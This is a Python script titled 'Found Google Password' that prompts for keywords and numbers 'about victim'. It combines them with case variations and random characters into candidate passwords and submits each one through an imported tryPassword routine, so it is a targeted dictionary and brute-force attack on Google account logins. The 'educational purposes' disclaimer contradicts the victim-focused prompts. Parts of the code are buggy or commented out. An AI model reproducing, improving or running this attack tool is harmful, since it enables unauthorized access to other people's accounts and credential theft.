#!/usr/bin/python
import sendRequest as sr
import itertools
from collections import Counter
from datetime import datetime
import os.path
import threading
import random
import time


character_limit = 12
character_min = 8

print("\tWELCOME to Found Google Password\n\n\tThis program is only for educational purposes, use this script only on your account, this program will ask you:")
print(
    "\n\t- Keywords about account (Split with ',')\n\t- Words to be produced contain numbers ('95','2017','123')? [y/N]\n\t\t- Numbers about victim (Split with ',')")
print(
    "\n\t- Words to be produced have character limit? [y/N]\n\t\t- How many letters do words contain maximum and minimum? (default: 8,12)")
print(
    "\n\t- If words must start with first letter uppercase (after this attempts the words will sent lowercase and with uppercase in all combined position)? [y/N]:\n\n")

keywords = input(
    "Keywords about account (Split with ',' and without spaces): ")
words = keywords.split(",")
length_words = len(words)

if(length_words <= 0 or len(keywords.strip()) <= 0):
    print("\n\tSorry, you have to enter at least one word. GOODBYE!\n")
    exit()

contain_number = input("Words contain numbers('95','2017','123')? [y/N]: ")
length_numbers = 0
if(contain_number == "Y" or contain_number == "y"):
    numbers_entered = input("Numbers about victim (Split with ','): ")
    numbers = numbers_entered.split(",")
    length_numbers = len(numbers)

have_character_limit = input(
    "Words have character limit? (default range: 8-12) [y/N]: ")
if(have_character_limit == "Y" or have_character_limit == "y"):
    try:
        character_limit = int(
            input("How many letters do words contain maximum? (Ex: 16): "))
    except ValueError:
        print("\n\tYou have to enter a number. Please, again!\n")
        print("\n\tGoodbye!")
        exit()

one_letter_upper = False
have_one_letter_upper = input(
    "Words have at least a character uppercase? (In google password this isn't required)[y,N]: ")
if(have_one_letter_upper == "Y" or have_one_letter_upper == "y"):
    one_letter_upper = True

# check correctness of words, removing spaces
for word in words:
    word = word.replace(" ", "")


def firstLetterUpper(word):
    if(one_letter_upper == True):
        return word.capitalize()
    else:
        return word


def minCharacter(word):
    if len(word) > character_min and len(word) < character_limit:
        return word
    else:
        return None


def invert(list1):
    list2 = []
    for l in list1:
        if(l.islower()):
            list2.append(l.capitalize())
        elif(l.isUpper()):
            list2.append(l.lower())
            list2.append(l.capitalize())
        else:
            list2.append(l.lower())
    return list2


def addThread(list1, list2, level):
    t1 = threading.Thread(target=mix, args=(list1, list2, level))
    t1.start()
    return t1


def tryRandom(nVocali):
    print('startin randomly')
    t1 = threading.Thread(target=tryRand, args=[nVocali])
    t1.start()
    return t1


vocali = ['a', 'e', 'i', 'o', 'u']


def getRandomLetter():
    letter = random.randint(33, 125)
    for i in range(0, random.randint(1, 5)):
        if(letter < 64 and letter > 57 or letter < 47 or letter > 125):
            letter = random.randint(33, 125)
    return chr(letter)


def mescolaLettere(passw):
    listPos = []
    passwfinal = ''
    for i in range(0, len(passw)):
        if(len(listPos) == 0):
            listPos.append(random.randint(0, len(passw)-1))
        n = random.randint(0, len(passw)-1)
        while(n in listPos):
            n = random.randint(0, len(passw))
        listPos.append(n)
    for i in range(0, len(passw)):
        passwfinal += passw[i]
    return passwfinal


def tryRand(nVocali):
    while(True):
        passw = ''
        for i in range(0, random.randint(2, nVocali)):
            passw += vocali[random.randint(0, 4)]
        for i in range(int(character_min + len(passw)+3), random.randint(character_min + len(passw), character_limit)):
            passw += getRandomLetter()
        passw = mescolaLettere(passw)
        sr.tryPassword(passw)


def controllo(word):
    return (firstLetterUpper(word))


def mix(list1, list2, level):
    preparedPassword = []
    minLength = len(min(list1, key=len) + min(list2, key=len) + '')

    if(minLength > character_limit):
        return None
    for i in list1:
        for j in list2:
            if level == 1:
                passw = controllo(i + j)
            else:
                passw = i + j
            if(passw != None):
                preparedPassword.append(passw)
                if len(passw) <= character_limit and len(passw) >= character_min:
                    sr.tryPassword(passw)

                '''
                try:
                    if(passw.count(list[1])<3 and passw.count(list2[j]) < 3):
                        if not sr.tryPassword(passw):
                            preparedPassword.append(passw)
                except:
                    if not sr.tryPassword(passw):
                        preparedPassword.append(passw)
                '''
    mix(preparedPassword, list2, level)
    mix(list2, preparedPassword, level)
    mix(list1, preparedPassword, level)
    mix(preparedPassword, list1, level)
    if(level < 2):
        mix(list1, list2, level+1)


def up():
    arr = words.copy()
    for i in range(0, len(arr)):
        arr[i] = arr[i].upper
    return arr


'''
def calculatePossibility(string, words, numbers, exponent):
    possibility = 0
    result = 0
    for word in words:
        if(len(string+word) <= character_limit):
            exponent.append(2)
            possibility += calculatePossibility(string +
                                                word, words, numbers, exponent)
        if length_numbers != 0:
            for number in numbers:
                if(len(string+number) <= character_limit):
                    exponent.append(1)
                    possibility += calculatePossibility(string +
                                                        number, words, numbers, exponent)

        if(len(string) <= character_limit and len(string) >= character_min):
            for i in range(0, len(exponent)):
                result += pow(exponent[i], i+1)
            return possibility + result

    return possibility
'''


def generazionePassword():
    only_words = []
    only_words = words.copy()
    '''
    if(length_numbers != 0):
        numberOfCombination = calculatePossibility('', words, numbers, [])
    else:
        numberOfCombination = calculatePossibility('', words, [], [])
    print(numberOfCombination)
    '''

    if(length_numbers != 0):
        for i in range(0, len(numbers)):
            words.append(numbers[i])
    invertedWords = []
    # tentativo con le semplici parole inserite dall'utente
    t1 = addThread(words, words, 1)
    invertedWords = invert(only_words)
    if(length_numbers != 0):
        for i in range(0, len(numbers)):
            invertedWords.append(numbers[i])
    for word in words:
        if(len(word) >= character_min and len(word) <= character_limit):
            sr.tryPassword(word)
    for word in invertedWords:
        if(len(word) >= character_min and len(word) <= character_limit):
            sr.tryPassword(word)
    timeBetweenSleep = 2
    # tentativo con le parole invertite e le parole già conosciute
    time.sleep(timeBetweenSleep)
    t2 = addThread(invertedWords, words, 2)
    time.sleep(timeBetweenSleep)
    t3 = addThread(words, invertedWords, 2)
    time.sleep(timeBetweenSleep)
    t4 = addThread(invertedWords, invertedWords, 2)
    t3.join()
    t4.join()
    t2.join()

    t1.join()

    # level 3 trying password over the request of the user
    t5 = addThread(words, words, 3)
    t5.join()

    # livello di difficoltà 2: tentativi con tutto uppercase o lower
    '''
    low = True
    up = True
    for i in range(0, len(words)):
        if not words[i].islower:
            low = False
        if not words[i].isupper:
            up = False
    if(up == False):
        t5 = addThread(up(), up(), 1)
    '''
    # livello di difficoltà 5: parole a caso con almeno tre vocali
    #t7 = tryRandom(5)
    # t7.join()
    # t8 = tryRandom(4)
    # t9 = tryRandom(4)
    # t9 = tryRandom(9)
    # exit()


generazionePassword()


'''
level of difficult:
1 - mix of words and letters with the first char uppercase
2 - mix of words with first letters of words uppercase
3 - mix of words with uppercase randomly
4 - adding special character and starting brute force with some rules

'''

'''
approvedWords = []
twoWords = []
threads = []


def addThread(list1, list2, level):
    t1 = threading.Thread(target=secondDecrypt, args=(list1, list2, level))
    t1.start()
    threads.append(t1)
    return t1


def firstDecrypt():
    # Words only with one word no complex
    for i in range(0, len(words)):
        passw = controllo(words[i])

        if passw != None:
            sr.tryPassword(passw)
            approvedWords.append(passw)
    # Words with the number on the end
    if length_numbers:
        for i in range(0, len(approvedWords)):
            for j in range(0, len(numbers)):
                sr.tryPassword(approvedWords[i]+numbers[j])
                # sr.tryPassword(numbers[j] + approvedWords[i]) for accelerate the processsudo easy_install pip


def lower(array):
    arr = array.copy()
    for i in range(0, len(arr)):
        arr[i] = arr[i].lower()
    return arr


def upper(arr):
    array = arr.copy()
    for i in range(0, len(array)):
        array[i] = array[i].capitalize()
    return array


lower_words = lower(words)
upper_words = upper(words)


def secondDecrypt(first, second, level):
    # Words with two word
    generatedWord = []
    stop = True
    for i in range(0, len(first)):
        for j in range(0, len(second)):
            passw = controllo(first[i] + second[j])
            if passw != None:
                stop = False
                sr.tryPassword(passw)
                generatedWord.append(passw)
    if stop == False:

        if level == 1:
            t1 = addThread(generatedWord, words, level)
            t1.join()

        elif level == 2:
            t3 = addThread(lower(generatedWord), upper_words, level)
            t2 = addThread(lower(generatedWord), lower_words, level)
            t2.join()
            t3.join()

        elif level == 3:
            t3 = addThread(generatedWord, lower_words, level)
            t2 = addThread(generatedWord, upper_words, level)
            t2.join()
            t3.join()

        if length_numbers != 0:
            t2 = addThread(generatedWord, numbers, level)
            t2.join()


def generazionePassword():
    print(words)
    global one_letter_upper
    if(length_numbers == 0):
        threads.append(threading.Thread(target=firstDecrypt, args=()).start())
    else:
        addThread(words, numbers, 1)
        addThread(numbers, words, 1)
    t2 = addThread(words, words, 1)
    t2.join()
    if one_letter_upper == False:
        one_letter_upper = True
        t2 = addThread(words, words, 1)
        t2.join()
    if length_numbers != 0:
        one_letter_upper = True
        t3 = threading.Thread(target=secondDecrypt, args=(numbers, words, 1))
        t3.start()
        threads.append(t3)
        t3.join()
    # starting with level 2

    # trying words with uppercase on first character of the word in the middle of words

    t3 = threading.Thread(target=secondDecrypt, args=(
        lower_words, lower_words, 2))
    t3.start()
    threads.append(t3)
    t3.join()

    # starting with level 3 TODO: da ridefinire bene per avere tutte le combinazioni ripassate con le maiuscole
    t4 = addThread(upper_words, lower_words, 3)
    t5 = addThread(upper_words, upper_words, 3)
    t4.join()
    t5.join()

    # starting with level 4 completely randomly
    alphabeth = []
    for i in range(33, 126):
        alphabeth.append(chr(i))
    addThread(alphabeth, alphabeth, 4)'''


# generazionePassword()
